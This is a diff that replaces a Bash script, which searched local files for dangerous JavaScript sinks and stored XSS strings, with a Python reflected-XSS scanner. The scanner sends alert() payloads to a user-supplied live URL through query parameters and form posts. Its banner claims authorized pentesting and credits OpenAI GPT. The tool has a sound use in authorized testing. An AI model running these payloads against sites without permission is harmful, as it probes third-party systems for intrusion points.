@@ -1,94 +1,76 @@
-#!/bin/bash
+import requests
+from urllib.parse import urlparse, urljoin
+import re
+import sys
 
-# Cores
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-CYAN='\033[0;36m'
-NC='\033[0m' # Reset
+# Payloads XSS comuns
+payloads = [
+    "<script>alert('XSS')</script>",
+    "\"><svg/onload=alert('XSS')>",
+    "'><img src=x onerror=alert('XSS')>",
+    "\"><iframe src=javascript:alert('XSS')>",
+    "\"><body onload=alert('XSS')>",
+    "<svg><script>alert('XSS')</script>",
+]
 
-# Payloads avançados (cortado para 10, mas você pode adicionar mais)
-PAYLOADS=(
-  "<script>alert(1)</script>"
-  "\"><script>alert(1)</script>"
-  "'><img src=x onerror=alert(1)>"
-  "\"><svg/onload=alert(1)>"
-  "<body onload=alert(1)>"
-  "<iframe src=javascript:alert(1)>"
-  "<object data=javascript:alert(1)>"
-  "<a href=javascript:alert(1)>Clique</a>"
-  "<img src=x:alert(1) onerror=eval(src)>"
-  "<input onfocus=alert(1) autofocus>"
-)
+# Cores no terminal
+def color(text, color_code):
+    return f"\033[{color_code}m{text}\033[0m"
 
-function cabecalho() {
-  clear
-  echo -e "${CYAN}=============================================="
-  echo -e "  🛡️  Scanner de XSS (.js / .html) + Testes reais"
-  echo -e "        Profissional - via Termux/Bash"
-  echo -e "==============================================${NC}"
-}
+def banner():
+    print(color("==== XSS Scanner (Python3) ====", "1;36"))
+    print(color("Pentest autorizado | By OpenAI GPT", "1;33"))
+    print()
 
-function pedir_arquivo() {
-  echo -ne "${YELLOW}Digite o nome do arquivo .js ou .html: ${NC}"
-  read ARQUIVO
-  if [[ ! -f "$ARQUIVO" ]]; then
-    echo -e "${RED}❌ Arquivo '$ARQUIVO' não encontrado.${NC}"
-    return 1
-  fi
-  return 0
-}
+def test_url(base_url):
+    print(color("[+] Testando URL com payloads XSS:", "1;34"))
+    for payload in payloads:
+        test = f"{base_url}?test={payload}"
+        try:
+            response = requests.get(test, timeout=10)
+            if payload in response.text:
+                print(color(f"[VULNERÁVEL] -> {test}", "1;31"))
+            else:
+                print(color(f"[OK] -> {test}", "1;32"))
+        except Exception as e:
+            print(color(f"[ERRO] -> {test} | {e}", "1;31"))
 
-function barra_progresso() {
-  echo -ne "${BLUE}Progresso: "
-  for i in {1..25}; do
-    echo -ne "#"
-    sleep 0.03
-  done
-  echo -e "${NC}"
-}
+def find_forms(url):
+    try:
+        resp = requests.get(url, timeout=10)
+        forms = re.findall(r'<form.*?>', resp.text, re.IGNORECASE)
+        return forms
+    except:
+        return []
 
-function escanear_arquivo() {
-  echo -e "\n${GREEN}🔎 Varredura de padrões perigosos em: $ARQUIVO${NC}"
-  barra_progresso
+def test_forms(url):
+    forms = find_forms(url)
+    if not forms:
+        print(color("[!] Nenhum formulário detectado na página.", "1;33"))
+        return
 
-  RESULTADO="resultado_${ARQUIVO}.txt"
+    print(color(f"[+] {len(forms)} formulário(s) encontrado(s), testando com payloads...", "1;34"))
+    for form in forms:
+        for payload in payloads:
+            data = {'test': payload}
+            try:
+                resp = requests.post(url, data=data, timeout=10)
+                if payload in resp.text:
+                    print(color(f"[VULNERÁVEL] Formulário -> {url} -> Payload detectado!", "1;31"))
+                else:
+                    print(color(f"[OK] Formulário -> {url}", "1;32"))
+            except Exception as e:
+                print(color(f"[ERRO] -> {url} | {e}", "1;31"))
 
-  grep -Eni 'innerHTML|outerHTML|document.write|insertAdjacentHTML|setAttribute|eval|Function|onerror|srcdoc|location.href|window.name|src="javascript:' "$ARQUIVO" > "$RESULTADO"
-
-  LINHAS=$(wc -l < "$RESULTADO")
-
-  if [[ $LINHAS -eq 0 ]]; then
-    echo -e "${YELLOW}Nenhum padrão perigoso encontrado.${NC}"
-  else
-    echo -e "${GREEN}✅ $LINHAS possíveis vulnerabilidades detectadas."
-    echo -e "📁 Detalhes salvos em: ${CYAN}$RESULTADO${NC}"
-  fi
-}
-
-function testar_payloads_reais() {
-  echo -e "\n${GREEN}🚨 Testando payloads XSS diretamente no conteúdo...${NC}"
-  for payload in "${PAYLOADS[@]}"; do
-    echo -ne "${BLUE}Testando: ${NC}$payload... "
-    grep -qF "$payload" "$ARQUIVO" && \
-      echo -e "${RED}⚠️ Encontrado!${NC}" || \
-      echo -e "${GREEN}Seguro.${NC}"
-    sleep 0.1
-  done
-}
-
-function menu() {
-  while true; do
-    cabecalho
-    if pedir_arquivo; then
-      escanear_arquivo
-      testar_payloads_reais
-    fi
-    echo -ne "\n${CYAN}Deseja analisar outro arquivo? (s/n): ${NC}"
-    read RESP
-    [[ "$RESP" =~ ^[Nn]$ ]] && echo -e "${GREEN}Saindo... 👋${NC}" && break
-  done
-}
-
-menu
+if __name__ == "__main__":
+    banner()
+    try:
+        target = input(color("Digite a URL completa (ex: https://site.com): ", "1;35"))
+        if not target.startswith("http"):
+            print(color("[ERRO] URL inválida. Use http:// ou https://", "1;31"))
+            sys.exit(1)
+        test_url(target)
+        test_forms(target)
+        print(color("Teste finalizado!", "1;36"))
+    except KeyboardInterrupt:
+        print("\n" + color("Encerrado pelo usuário.", "1;31"))
